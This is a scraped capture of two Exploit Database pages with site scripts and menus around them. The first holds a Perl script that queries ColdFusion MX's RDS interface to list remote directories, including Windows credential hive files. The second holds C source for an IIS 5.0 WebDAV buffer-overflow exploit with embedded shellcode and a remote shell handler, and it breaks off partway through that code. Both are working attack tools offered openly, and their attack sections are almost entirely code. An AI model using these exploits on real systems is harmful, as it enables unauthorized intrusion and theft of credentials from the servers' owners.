16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 50
ColdFusion MX - Remote Development Service - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDColdFusion MX - Remote Development ServiceEDB-ID:50CVE:EDB Verified:Author:angry packetType:remoteExploit:/Platform:WindowsDate:2003-07-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl# RDS_c_Dump.pl# By angry packet###     THIS IS AN UNPATCHED VULNERABILITY - THIS IS AN UNPATCHED VULNERABILITY## ColdFusion 6 MX Server does several things in order to get remote dir structure so we will need# to recreate these functions. This is a "almost" complete emulation of a dreamweaver client connection,# in like one full HTTP1/1 session witin netcat.## I would like to point out that the ASPSESSID never validates so you can change this on the fly.## Due to certian current situations I am not allowed to release full exploit code with# ( READ, RETRIEVE, WRITE ) functions.## Sample output:# --------------------------------# Vic7im1@cipher:~/Scripts/RDS_Sploit$ perl RDS_c_Dump.pl## POST /CFIDE/main/ide.cfm?CFSRV=IDE&ACTION=BrowseDir_Studio HTTP/1.1## Request String Value: 3:STR:15:C:/WINNT/repairSTR:1:*STR:0:# Content-Length: 37# Please wait.. ..# HTTP/1.1 100 Continue# Server: Microsoft-IIS/5.0# Date: Tue, 01 Jul 2003 10:30:43 GMT## HTTP/1.1 200 OK# Server: Microsoft-IIS/5.0# Date: Tue, 01 Jul 2003 10:30:43 GMT# Connection: close# Content-Type: text/html## 50:2:F:11:autoexec.nt1:63:4383:0,02:F:9:config.nt1:64:25773:0,02:F:7:default1:66:1187843:0,# 02:F:10:ntuser.dat1:66:1187843:0,02:F:3:sam1:65:204803:0,# 02:F:12:secsetup.inf1:66:5735303:0,02:F:8:security1:65:286723:0,# 02:F:9:setup.log1:66:1551943:0,02:F:8:software1:67:65331203:0,02:F:6:system1:66:9748483:0,0# Vic7im1@cipher:~/Scripts/RDS_Sploit$# ----------------------------------use strict;use IO::Socket;use vars qw($response @clength @rarray);## Dreamweaver string requests to ide.cfm## --------------------------------------#1:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46#2:  3:STR:7:C:/_mm/STR:1:*STR:0:		      		Content-Length: 28#3:  3:STR:6:C:/_mmSTR:9:ExistenceSTR:0:STR:0:STR:0:   		Content-Length: 47#4:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46#5:  3:STR:10:C:/_notes/STR:1:*STR:0:		      		Content-Length: 32#6:  5:STR:9:C:/_notesSTR:9:ExistenceSTR:0:STR:0:STR:0 		Content-Length: 50#7:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46#8:  5:STR:12:C:/XYIZNWSK/STR:6:CreateSTR:0:STR:0:STR:0: 	Content-Length: 51#9:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#10: 3:STR:3:C:/STR:1:*STR:0:					Content-Length: 24#11: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#12: 5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:	Content-Length: 53#13: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#14: 5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:	Content-Length: 53#15: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#16: 5:STR:11:C:/XYIZNWSKSTR:6:RemoveSTR:0:STR:0:DSTR:0:	Content-Length: 51#17: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#18: 3:STR:8:C:/WINNTSTR:1:*STR*STR:0:				Content-Length: 29#19: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46#20: 3:STR:15:C:/WINNT/repairSTR:1:*STR:0:			Content-Length: 37# Static Content-Lenght: $string_val if you plan on leaving C:\WINNT\repair you will need to know# the $string_val.@clength = ( "Content-Length: 46","Content-Length: 28","Content-Length: 47","Content-Length: 46",#"Content-Length: 32",#"Content-Length: 50","Content-Length: 46","Content-Length: 51","Content-Length: 46","Content-Length: 24","Content-Length: 46","Content-Length: 53","Content-Length: 46","Content-Length: 53","Content-Length: 46","Content-Length: 51","Content-Length: 46","Content-Length: 29","Content-Length: 46","Content-Length: 37");@rarray = ( "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","3:STR:7:C:/_mm/STR:1:*STR:0:","3:STR:6:C:/_mmSTR:9:ExistenceSTR:0:STR:0:STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",#"3:STR:10:C:/_notes/STR:1:*STR:0:",#"5:STR:9:C:/_notesSTR:9:ExistenceSTR:0:STR:0:STR:0","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","5:STR:12:C:/XYIZNWSK/STR:6:CreateSTR:0:STR:0:STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","3:STR:3:C:/STR:1:*STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","5:STR:11:C:/XYIZNWSKSTR:6:RemoveSTR:0:STR:0:DSTR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","3:STR:8:C:/WINNTSTR:1:*STR*STR:0:","3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:","3:STR:15:C:/WINNT/repairSTR:1:*STR:0:");system("clear");# change target addy below.my $TARGET = "192.168.0.100";my $PORT = "80";my $STRING = "C:/WINNT/repair";my $POST = "POST /CFIDE/main/ide.cfm?CFSRV=IDE&ACTION=BrowseDir_Studio HTTP/1.1\r\n";print "Generating Socket with Array Directory Values.\n";my ( $i, $c);for ( $i = 0; $i < @rarray; $i++  ) {for ( $c = 0; $c < @clength; $c++ ) {if( $i == $c ) {&gen_sock($TARGET, $PORT, $rarray[$i], $clength[$c]);}}}sub gen_sock() {my $sock = new IO::Socket::INET(PeerAddr => $TARGET,PeerPort => $PORT,Proto	 => 'tcp',);die "Socket Could not be established ! $!" unless $sock;print "Target: $TARGET:$PORT\n";print "$POST\n";print "Request String Value: $rarray[$i]\n";print "$clength[$c]\n";print "Please wait.. ..\n";print $sock "$POST";print $sock "Content-Type: application/x-ColdFusionIDE\r\n";print $sock "User-Agent: Dreamweaver-RDS-SCM1.00\r\n";print $sock "Host: $TARGET\r\n";print $sock "$clength[$c]\r\n";print $sock "Connection: Keep-Alive\r\n";print $sock "Cache-Control: no-cache\r\n";print $sock "Cookie: ASPSESSIONIDQQQQGLDK=LPIHIKCAECKACDGPJCOLOAOJ\r\n";print $sock "\r\n";print $sock "$rarray[$i]";# lets return and print data to termwhile($response = <$sock>) {chomp($response);print "$response\n";}close($sock);}# milw0rm.com [2003-07-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 51
Microsoft IIS 5.0 - WebDAV Remote Code Execution (3) (xwdav) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 5.0 - WebDAV Remote Code Execution (3) (xwdav)EDB-ID:51CVE:2003-0109EDB Verified:Author:SchizoprenicType:remoteExploit:/Platform:WindowsDate:2003-07-08Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** IIS 5.0 WebDAV Exploit Xnuxer Lab* By Schizoprenic, Copyright (c) 2003* WebDAV exploit without netcat or telnet and with pretty magic number as RET*/#include <stdio.h>#include <errno.h>#include <string.h>#include <stdlib.h>#include <fcntl.h>#include <sys/types.h>#include <sys/socket.h>#include <netdb.h>#include <netinet/in.h>#define  RET             0xc9c9#define  LOADLIBRARYA    0x0100107c#define  GETPROCADDRESS  0x01001034#define  PORT_OFFSET     1052#define  LOADL_OFFSET    798#define  GETPROC_OFFSET  815#define  NOP             0x90unsigned char shellcode[] =            // Deepzone shellcode"\x68\x5e\x56\xc3\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c""\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04""\x90\x90\x90\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99""\xc4\x18\x74\x40\xb8\xd9\x99\x14\x2c\x6b\xbd\xd9\x99\x14""\x24\x63\xbd\xd9\x99\xf3\x9e\x09\x09\x09\x09\xc0\x71\x4b""\x9b\x99\x99\x14\x2c\xb3\xbc\xd9\x99\x14\x24\xaa\xbc\xd9""\x99\xf3\x93\x09\x09\x09\x09\xc0\x71\x23\x9b\x99\x99\xf3""\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x7c\xbc\xd9\x99""\xcf\x14\x2c\x70\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9\x99""\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x74\xbc\xd9""\x99\xcf\x14\x2c\x68\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9""\x99\x5e\x1c\x6c\xbc\xd9\x99\xdd\x99\x99\x99\x14\x2c\x6c""\xbc\xd9\x99\xcf\x66\x0c\xae\xbc\xd9\x99\x14\x2c\xb4\xbf""\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\xa8\xbf""\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\x68\xbc""\xd9\x99\x14\x24\xb4\xbf\xd9\x99\x3c\x14\x2c\x7c\xbc\xd9""\x99\x34\x14\x24\xa8\xbf\xd9\x99\x32\x14\x24\xac\xbf\xd9""\x99\x32\x5e\x1c\xbc\xbf\xd9\x99\x99\x99\x99\x99\x5e\x1c""\xb8\xbf\xd9\x99\x98\x98\x99\x99\x14\x2c\xa0\xbf\xd9\x99""\xcf\x14\x2c\x6c\xbc\xd9\x99\xcf\xf3\x99\xf3\x99\xf3\x89""\xf3\x98\xf3\x99\xf3\x99\x14\x2c\xd0\xbf\xd9\x99\xcf\xf3""\x99\x66\x0c\xa2\xbc\xd9\x99\xf1\x99\xb9\x99\x99\x09\xf1""\x99\x9b\x99\x99\x66\x0c\xda\xbc\xd9\x99\x10\x1c\xc8\xbf""\xd9\x99\xaa\x59\xc9\xd9\xc9\xd9\xc9\x66\x0c\x63\xbd\xd9""\x99\xc9\xc2\xf3\x89\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66""\x0c\x67\xbd\xd9\x99\xf3\x9a\xca\x66\x0c\x9b\xbc\xd9\x99""\x14\x2c\xcc\xbf\xd9\x99\xcf\x14\x2c\x50\xbc\xd9\x99\xcf""\xca\x66\x0c\x9f\xbc\xd9\x99\x14\x24\xc0\xbf\xd9\x99\x32""\xaa\x59\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14""\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3""\xa9\x66\x0c\xd6\xbc\xd9\x99\x72\xd4\x09\x09\x09\xaa\x59""\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70""\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66""\x0c\xd6\xbc\xd9\x99\x1a\x24\xfc\xbf\xd9\x99\x9b\x96\x1b""\x8e\x98\x99\x99\x18\x24\xfc\xbf\xd9\x99\x98\xb9\x99\x99""\xeb\x97\x09\x09\x09\x09\x5e\x1c\xfc\xbf\xd9\x99\x99\xb9""\x99\x99\xf3\x99\x12\x1c\xfc\xbf\xd9\x99\x14\x24\xfc\xbf""\xd9\x99\xce\xc9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70""\xbc\xd9\x99\x34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xc9\x66""\x0c\xd6\xbc\xd9\x99\x12\x1c\xfc\xbf\xd9\x99\xf3\x99\xc9""\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99""\x34\xc9\x66\x0c\x93\xbc\xd9\x99\xf3\x99\x14\x24\xfc\xbf""\xd9\x99\xce\xf3\x99\xf3\x99\xf3\x99\x14\x2c\x70\xbc\xd9""\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6""\xbc\xd9\x99\xaa\x50\xa0\x14\xfc\xbf\xd9\x99\x96\x1e\xfe""\x66\x66\x66\xf3\x99\xf1\x99\xb9\x99\x99\x09\x14\x2c\xc8""\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66""\x0c\x97\xbc\xd9\x99\x10\x1c\xf8\xbf\xd9\x99\xf3\x99\x14""\x24\xfc\xbf\xd9\x99\xce\xc9\x14\x2c\xc8\xbf\xd9\x99\x34""\xc9\x14\x2c\x74\xbc\xd9\x99\x34\xc9\x66\x0c\xd2\xbc\xd9""\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\xf3\x99\x12\x1c\xf8""\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc9\x12\x1c\xc8""\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c""\xde\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\x70\x20""\x67\x66\x66\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x8b""\xbc\xd9\x99\x14\x2c\xc4\xbf\xd9\x99\x34\xc9\x66\x0c\x8b""\xbc\xd9\x99\xf3\x99\x66\x0c\xce\xbc\xd9\x99\xc8\xcf\xf1""\xe5\x89\x99\x98\x09\xc3\x66\x8b\xc9\xc2\xc0\xce\xc7\xc8""\xcf\xca\xf1\xad\x89\x99\x98\x09\xc3\x66\x8b\xc9\x35\x1d""\x59\xec\x62\xc1\x32\xc0\x7b\x70\x5a\xce\xca\xd6\xda\xd2""\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd""\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed""\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6""\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xd2\xdc\xcb\xd7\xdc""\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc""\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff""\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc""\xea\xea\xd8\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9""\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6""\xfa\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xce\xeb\xf0""\xed\xfc\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc\xe9\x99\xda""\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xdc\xe1\xf0""\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xda\xf6\xfd\xfc\xfd""\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xa5\xf0\xe3\xf8\xf7""\xd9\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xa7""\x9b\x99\x86\xd1\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x95\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\xda\xd4\xdd\xb7\xdc\xc1\xdc\x99\x99\x99\x99\x99""\x89\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char jumpcode[] = "\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7";char body[] = "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n""<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n""</g:searchrequest>\r\n";void usage(char *prog){printf("Remote Exploit for IIS 5.0 WebDAV by Xnuxer\n""Bug overflow NTDLL.DLL\n""Usage: %s <victim>\n", prog);exit(-1);}void shell(int sock){fd_set  fd_read;char buff[1024];int n;while(1) {FD_SET(sock,&fd_read);FD_SET(0,&fd_read);if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;if( FD_ISSET(sock, &fd_read) ) {n=read(sock,buff,sizeof(buff));if (n == 0) {printf ("Connection closed.\n");exit(EXIT_FAILURE);} else if (n < 0) {perror("read remote");exit(EXIT_FAILURE);}write(1,buff,n);}if ( FD_ISSET(0, &fd_read) ) 